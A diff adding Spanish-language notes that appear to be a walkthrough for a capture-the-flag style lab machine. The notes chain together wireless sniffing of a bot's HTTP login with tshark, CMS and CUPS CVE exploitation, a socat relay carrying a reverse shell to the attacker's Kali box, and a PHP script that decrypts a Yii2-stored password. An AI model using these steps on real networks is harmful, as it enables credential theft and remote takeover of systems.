@@ -1,0 +1,79 @@
+* entra por RDP con las credenciales obtenidas
+
+* enciende le wifi para poder acceder a los servicios del aeropuerto
+
+* tienes 2 interfaces de red wlan2 wlan3. coloca una en modo monitor y ponla en el mismo canal que la otra
+
+  --- colca en modo monitor
+
+    sudo ip link set wlan3 down
+    sudo iw dev wlan3 set type monitor
+    sudo ip link set wlan3 up
+
+  --- ahora revisa el canal de la que esta en modo normal (creo que es modo manejado) 
+
+    iw dev wlan2 info
+
+  --- coloca en el canal la interfaz que esta monitor
+
+    sudo iw dev wlan3 set channel 6
+
+* usa el tshark en el sistema para capturar el trafico  
+
+  sudo tshark -i wlan3 -Y "http.request.method == POST" -T fields -e ip.src -e http.host -e urlencoded-form.key -e urlencoded-form.value
+
+* Captura el usuario y la contraseña que el bot lanza
+
+* con el usuario y la contraseña el cms es vulnerable a  CVE-2026-44011 
+
+* encuentra un cve y explotalo
+
+* necesitas usar socat para llegar a la maquina que nos interesa hackera
+  + de esta manera la maquian con RDP te envia a kali la revshell
+    /socat TCP-LISTEN:4444,fork,reuseaddr TCP:10.10.15.254:4444
+
+* ahora si, lanza tu revshell y recibe el usuario www-data
+
+* revisa el .env y obten las credenciales en dicho .env
+
+* revisa la base de datos y la tabla htbairways_settings
+
+* encontraras una contraseña en base64 y encriptada. necesitaras installar YII en parrot para desencriptarla
+
+* crea carpeta e instala yiisoft 
+  mkdir decrypt-yii && cd decrypt-yii
+  composer init --no-interaction
+  composer require yiisoft/yii2
+
+* crea dec.php
++++ decrypt-yii/Dec.php +++
+<?php
+require __DIR__ . '/vendor/autoload.php';
+
+use yii\base\Security;
+
+$raw = '<Contraseña base64 encontrada en htbairways_settings>';
+$key = '<clave encontrada en env>';
+
+$bytes = base64_decode($raw, true);
+if ($bytes === false) {
+    die("Base64 inválido\n");
+}
+
+$security = new Security();
+// Yii2 >= 2.0.40 permite pasar la key directamente
+try {
+    $plain = $security->decryptByKey($bytes, $key);
+    var_dump($plain);
+} catch (\Throwable $e) {
+    echo "FALLÓ: " . get_class($e) . ': ' . $e->getMessage() . "\n";
+}
+
++++ EOF +++
+
+* ejecuta "php decrypt.php" y cosecha la contraseña
+
+* con el nuevo usuario un ssh entablado por proxychains investiga el servicio cups. es vulnerable a a un CVE-2026-34990
+
+* listo ejecucion remota de comandos
+
